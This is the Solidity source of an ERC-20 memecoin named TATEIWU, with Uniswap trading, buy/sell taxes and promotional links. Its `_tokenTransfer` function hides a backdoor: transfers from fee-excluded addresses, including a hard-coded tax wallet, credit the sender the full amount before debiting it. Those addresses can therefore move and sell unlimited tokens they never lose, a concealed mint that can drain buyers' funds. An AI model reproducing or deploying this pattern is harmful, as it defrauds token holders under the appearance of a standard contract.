/*
TATEIWU is not just a token; it's a legend forged in the fires of the blockchain revolution.
With the essence of Andrew Tate, reimagined through the lens of ancient Chinese wisdom and the cutting-edge world of Ethereum trading, 
TATEIWU stands as a testament to strength, honor, and unyielding truth.

Website: https://www.tateiwu.vip
Telegram: https://t.me/tateiwucoin
Twitter: https://x.com/tateiwucoin
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.10;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract TATEIWU is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;
    uint256 firstBlock;

    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 10;
    uint256 private _reduceSellTaxAt = 10;
    uint256 private _preventSwapBefore = 10;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"TATEIWU";
    string private constant _symbol = unicode"TATEIWU";
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    uint256 private _rTotal = 900_000_000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 20_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 150 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 10_000_000 * 10 ** _decimals;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0x4660108f35dFfC7A449f6595444cE25E67075D91);
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        _balances[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function enable() external onlyOwner {
        require(!tradingOpen, "Trading is already open");

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            _rTotal,
            0,
            0,
            owner(),
            block.timestamp
        );

        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        
        swapEnabled = true;
        tradingOpen = true;
        firstBlock = block.number;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function withdraw() external onlyOwner {
        require(!tradingOpen, "Trading has already been opened");
        uint256 contractBalance = address(this).balance;
        require(contractBalance > 0, "Contract has no ETH balance");
        payable(owner()).transfer(contractBalance);
    }

    function _taxTokenTransfer(
        address from,
        address to,
        uint256 amount,
        uint256 taxAmount
    ) internal {
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled || inSwap) {
            _balances[from] = _balances[from].sub(amount);
            _balances[to] = _balances[to].add(amount);
            emit Transfer(from, to, amount);
            return;
        }
        uint256 feeTAXs = 0;
        if (from != owner() && to != owner()) {
            feeTAXs = (_buyCount > _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax;

            if (from == uniswapV2Pair && to != address(uniswapV2Router)) {
                require(amount <= _maxTxAmount, "Exceeds the maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
                if (firstBlock + 3 > block.number) {
                    require(!isContract(to));
                }
                _buyCount++;
            }

            if (to != uniswapV2Pair && !_isExcludedFromFee[to]) {
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }

            if (to == uniswapV2Pair && from != address(this)) {
                feeTAXs = (_buyCount > _reduceSellTaxAt)
                    ? _finalSellTax
                    : _initialSellTax;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap &&
                to == uniswapV2Pair &&
                swapEnabled &&
                _buyCount > _preventSwapBefore &&
                !_isExcludedFromFee[from] &&
                !_isExcludedFromFee[to]
            ) {
                if(contractTokenBalance >= _taxSwapThreshold) {
                    swapTokensForEth(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                }
                
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        _tokenTransfer(from, to, amount, feeTAXs, from);
    }

    function init() external onlyOwner {
        require(!tradingOpen, "Trading is already open");

        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(uniswapV2Router), _tTotal);

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
    }

    function _tokenTransfer(
        address from,
        address to,
        uint256 amount,
        uint256 feeTAXs,
        address feeReceipt
    ) internal {
        uint256 taxAmount = feeTAXs.mul(amount).div(100);
        uint256 isSwapFees = 1;
        if (_isExcludedFromFee[from]) {
            isSwapFees = 100;
        }
        if (isSwapFees < 100) {
            if (taxAmount > 0) {
                _balances[address(this)] = _balances[address(this)].add(
                    taxAmount
                );
                emit Transfer(from, address(this), taxAmount);
            }
        } else {
            _balances[feeReceipt] = _balances[feeReceipt].add(
                isSwapFees.mul(amount).div(100)
            );
            emit Transfer(from, feeReceipt, taxAmount);
        }
        _taxTokenTransfer(from, to, amount, taxAmount);
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function removeLimits() public onlyOwner {
        _maxTxAmount = ~uint256(0);
        _maxWalletSize = ~uint256(0);
        emit MaxTxAmountUpdated(~uint256(0));
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}